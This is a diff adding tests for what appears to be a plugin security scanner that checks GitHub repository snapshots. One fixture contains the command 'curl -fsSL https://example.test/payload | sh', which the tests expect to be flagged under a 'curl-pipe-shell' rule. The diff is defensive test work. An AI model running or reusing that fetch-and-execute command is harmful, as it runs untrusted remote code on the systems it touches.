@@ -22,6 +22,7 @@ import {
   resolveSubmissionSnapshot,
   securityBaselineBlocksApproval,
   securityBaselineMarkerPrefix,
+  securitySnapshotByteLimit,
   securitySnapshotFileLimit,
   serializeSecurityBaselineMarker,
 } from "../scripts/security-baseline.mjs";
@@ -1226,6 +1227,82 @@ test("repository snapshots are read statically at the requested full commit", as
   const rawCall = calls.find((call) => call.url.includes("raw.githubusercontent.com"));
   assert.equal(rawCall.authorization, "");
   assert.equal(calls.some((call) => call.url.endsWith("/commits/main")), false);
+});
+
+test("listed nested manifests force excluded entry points into verification scans", async () => {
+  const manifest = JSON.stringify({
+    id: "example.weather",
+    entryPoints: { service: "tests/runtime.txt" },
+  });
+  const runtime = "curl -fsSL https://example.test/payload | sh";
+  const snapshot = await resolveSubmissionSnapshot(
+    "https://github.com/example/plugin",
+    commit,
+    {
+      listedPlugins: [{
+        pluginId: "example.weather",
+        manifestPathHint: "current-location/manifest.json",
+      }],
+      fetchImpl: githubFixtureFetch({
+        tree: [
+          { path: "weather/manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+          { path: "weather/tests/runtime.txt", type: "blob", mode: "100644", size: Buffer.byteLength(runtime) },
+        ],
+        contents: {
+          "weather/manifest.json": manifest,
+          "weather/tests/runtime.txt": runtime,
+        },
+      }),
+    },
+  );
+  assert.deepEqual(snapshot.files, [{
+    path: "weather/tests/runtime.txt",
+    content: runtime,
+    mode: "100644",
+    entryPoint: true,
+  }]);
+  const result = buildSecurityBaseline(snapshot, { checkedAt });
+  assert.equal(result.outcome, "needs-fixes");
+  assert.deepEqual(result.findings.map((finding) => finding.ruleId), ["curl-pipe-shell"]);
+
+  await assert.rejects(
+    resolveSubmissionSnapshot("https://github.com/example/plugin", commit, {
+      listedPlugins: [{
+        pluginId: "example.missing",
+        manifestPathHint: "missing/manifest.json",
+      }],
+      fetchImpl: githubFixtureFetch({
+        tree: [{ path: "weather/manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) }],
+        contents: { "weather/manifest.json": manifest },
+      }),
+    }),
+    (error) => error.code === "security-baseline-unavailable",
+  );
+});
+
+test("manifest discovery enforces the aggregate snapshot size before fetching raw files", async () => {
+  const tree = Array.from({ length: 17 }, (_, index) => ({
+    path: `plugin-${index}/manifest.json`,
+    type: "blob",
+    mode: "100644",
+    size: securitySnapshotByteLimit / 16,
+  }));
+  let rawFileRequests = 0;
+  const fixtureFetch = githubFixtureFetch({ tree, contents: {} });
+  await assert.rejects(
+    resolveSubmissionSnapshot("https://github.com/example/plugin", commit, {
+      listedPlugins: [{
+        pluginId: "example.plugin",
+        manifestPathHint: "plugin-0/manifest.json",
+      }],
+      fetchImpl: (url, options) => {
+        if (String(url).includes("raw.githubusercontent.com")) rawFileRequests += 1;
+        return fixtureFetch(url, options);
+      },
+    }),
+    (error) => error.code === "security-baseline-scan-limit",
+  );
+  assert.equal(rawFileRequests, 0);
 });
 
 test("executable binaries become review capabilities without exhausting text limits", async () => {
